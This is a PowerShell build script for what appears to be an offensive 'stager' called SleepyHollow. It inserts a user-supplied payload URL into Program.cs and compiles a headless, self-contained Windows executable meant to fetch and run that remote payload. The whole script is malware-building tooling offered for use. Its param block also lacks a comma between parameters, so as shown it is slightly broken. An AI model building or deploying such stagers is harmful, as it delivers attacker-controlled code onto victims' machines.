param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadUrl
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = ".\SleepyHollow.exe"
)

function Replace-PayloadUrl{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )

    $filePath = ".\Program.cs"
    $content = Get-Content $filePath
    $newContent = $content -replace "<%URL%>", $PayloadUrl
    Set-Content $filePath $newContent
}

function Build-Stager{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )
    Replace-PayloadUrl $PayloadUrl
    $projectPath = ".\SleepyHollow.csproj"
    dotnet publish -c Release /p:DefineConstants="HEADLESS" --self-contained $projectPath
    Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath
}

Build-Stager $PayloadUrl
